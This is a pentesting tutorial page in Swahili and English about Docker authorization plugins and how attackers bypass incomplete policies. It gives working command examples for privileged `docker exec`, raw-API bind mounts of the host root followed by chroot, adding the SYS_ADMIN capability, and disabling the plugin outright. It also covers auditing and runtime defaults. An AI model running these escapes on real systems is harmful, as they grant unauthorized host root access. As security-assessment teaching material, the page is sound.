# Plugins za Authorization za Runtime

{{#include ../../../banners/hacktricks-training.md}}

## Muhtasari

Plugins za authorization za runtime ni layer ya ziada ya policy inayoamua ikiwa caller anaweza kutekeleza daemon action fulani. Docker ni mfano wa kawaida. Kwa default, mtu yeyote anayeweza kuwasiliana na Docker daemon huwa na control pana juu yake. Authorization plugins hujaribu kupunguza model hiyo kwa kuchunguza user aliye-authenticate na API operation iliyoombwa, kisha kuruhusu au kukataa request kulingana na policy.

Mada hii inahitaji ukurasa wake kwa sababu hubadilisha exploitation model wakati attacker tayari ana access kwa Docker API au kwa user aliye katika `docker` group. Katika mazingira hayo, swali si tena tu "naweza kufikia daemon?" bali pia "je, daemon imewekewa mipaka na authorization layer, na ikiwa ndivyo, je, layer hiyo inaweza kubypass kupitia endpoints ambazo hazijashughulikiwa, JSON parsing dhaifu, au permissions za plugin-management?"

## Uendeshaji

Request inapofika kwenye Docker daemon, authorization subsystem inaweza kupitisha request context kwa plugins moja au zaidi zilizosakinishwa. Plugin huona utambulisho wa user aliye-authenticate, maelezo ya request, headers zilizochaguliwa, na sehemu za request au response body wakati content type inafaa. Plugins nyingi zinaweza kuunganishwa kwa mnyororo, na access hutolewa tu ikiwa plugins zote zinaruhusu request.

Model hii inaonekana imara, lakini usalama wake unategemea kabisa jinsi mwandishi wa policy alivyoielewa API kwa ukamilifu. Plugin inayozuia `docker run --privileged` lakini inapuuza `docker exec`, inakosa JSON keys mbadala kama `Binds` ya kiwango cha juu, au inaruhusu plugin administration, inaweza kuunda hisia ya uzuiaji wa uongo huku ikiwa bado inaacha njia za moja kwa moja za privilege-escalation.

## Malengo ya Kawaida ya Plugins

Maeneo muhimu ya kukagua policy ni:

- container creation endpoints
- sehemu za `HostConfig` kama vile `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode`, na namespace-sharing options
- tabia ya `docker exec`
- plugin management endpoints
- endpoint yoyote inayoweza kuanzisha runtime actions kwa njia isiyo ya moja kwa moja nje ya policy model iliyokusudiwa

Kihistoria, mifano kama Twistlock's `authz` plugin na educational plugins rahisi kama `authobot` ilifanya model hii iwe rahisi kuchunguza kwa sababu policy files na code paths zake zilionyesha jinsi endpoint-to-action mapping ilivyotekelezwa. Kwa kazi ya assessment, somo muhimu ni kwamba mwandishi wa policy lazima aelewe API surface nzima badala ya command za CLI zinazoonekana zaidi.

## Matumizi Mabaya

Lengo la kwanza ni kujifunza ni nini hasa kimezuiwa. Ikiwa daemon inakataa action, error mara nyingi huvuja jina la plugin, jambo linalosaidia kutambua control inayotumika:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Ikiwa unahitaji endpoint profiling ya kina zaidi, tools kama `docker_auth_profiler` ni muhimu kwa sababu zinafanya kiotomatiki kazi inayojirudia ya kuangalia ni API routes na miundo ya JSON ipi inaruhusiwa kweli na plugin.

Ikiwa mazingira yanatumia plugin maalum na unaweza kuingiliana na API, orodhesha ni fields zipi za objects zinazochujwa kweli:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Ukaguzi huu ni muhimu kwa sababu kushindwa kwa authorization mara nyingi huhusiana na field maalum badala ya dhana nzima. Plugin inaweza kukataa pattern ya CLI bila kuzuia kikamilifu muundo sawa wa API.

### Mfano Kamili: `docker exec` Huongeza Privilege Baada ya Kuundwa kwa Container

Policy inayozuia uundaji wa container ya privileged lakini inaruhusu uundaji wa container ya unconfined pamoja na `docker exec` bado inaweza bypassiwa:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Ikiwa daemon itakubali hatua ya pili, mtumiaji amerejesha mchakato shirikishi wenye mapendeleo ndani ya container ambayo mwandishi wa policy aliamini kuwa imewekewa vikwazo.

### Mfano Kamili: Bind Mount Kupitia Raw API

Baadhi ya policy zilizovunjika hukagua umbo moja tu la JSON. Ikiwa root filesystem bind mount haijazuiwa kwa uthabiti, host bado inaweza ku-mountiwa:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Wazo hilo hilo linaweza pia kuonekana chini ya `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Athari yake ni kutoroka kabisa kutoka kwenye host filesystem. Jambo la kuvutia ni kwamba bypass inatokana na policy coverage isiyokamilika badala ya kernel bug.

### Mfano Kamili: Unchecked Capability Attribute

Ikiwa policy itasahau kuchuja attribute inayohusiana na capability, attacker anaweza kuunda container inayopata tena capability hatari:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Mara `CAP_SYS_ADMIN` au capability nyingine yenye nguvu sawa inapokuwepo, mbinu nyingi za breakout zilizoelezwa katika [capabilities.md](protections/capabilities.md) na [privileged-containers.md](privileged-containers.md) huwa zinaweza kufikiwa.

### Mfano Kamili: Kuzima Plugin

Ikiwa operations za plugin-management zinaruhusiwa, bypass iliyo safi zaidi inaweza kuwa kuzima control kabisa:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Hili ni kosa la policy katika kiwango cha control-plane. Layer ya authorization ipo, lakini user ambaye ilipaswa kumzuia bado ana ruhusa ya kuizima.

## Ukaguzi

Amri hizi zinalenga kubaini ikiwa layer ya policy ipo na ikiwa inaonekana kuwa kamili au ya juu juu.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Kinachovutia hapa:

- Ujumbe wa kukataliwa unaojumuisha jina la plugin huthibitisha kuwepo kwa authorization layer na mara nyingi hufichua implementation halisi.
- Orodha ya plugins inayoonekana kwa attacker inaweza kutosha kubaini ikiwa operations za kuzima au kusanidi upya zinawezekana.
- Policy inayozuia vitendo vya CLI vilivyo wazi pekee, lakini si raw API requests, inapaswa kuchukuliwa kuwa inaweza kubypass hadi ithibitishwe vinginevyo.

## Chaguo-msingi za Runtime

| Runtime / platform | Hali ya chaguo-msingi | Tabia ya chaguo-msingi | Udhaifu wa kawaida unaofanywa manually |
| --- | --- | --- | --- |
| Docker Engine | Haijawezeshwa kwa chaguo-msingi | Ufikiaji wa daemon kwa vitendo ni wa kila kitu au hakuna chochote isipokuwa authorization plugin imesanidiwa | plugin policy isiyokamilika, blacklists badala ya allowlists, kuruhusu plugin management, mapungufu ya field-level |
| Podman | Si equivalent ya moja kwa moja ya kawaida | Podman kwa kawaida hutegemea zaidi Unix permissions, rootless execution, na maamuzi ya API exposure kuliko Docker-style authz plugins | kuweka wazi rootful Podman API kwa upana, socket permissions dhaifu |
| containerd / CRI-O | Control model tofauti | Runtimes hizi kwa kawaida hutegemea socket permissions, node trust boundaries, na controls za orchestrator za higher layer badala ya Docker authz plugins | kumount socket kwenye workloads, node-local trust assumptions dhaifu |
| Kubernetes | Hutumia authn/authz kwenye API-server na kubelet layers, si Docker authz plugins | Cluster RBAC na admission controls ndizo policy layer kuu | RBAC yenye ruhusa pana kupita kiasi, admission policy dhaifu, kuweka wazi kubelet au runtime APIs moja kwa moja |

{{#include ../../../banners/hacktricks-training.md}}
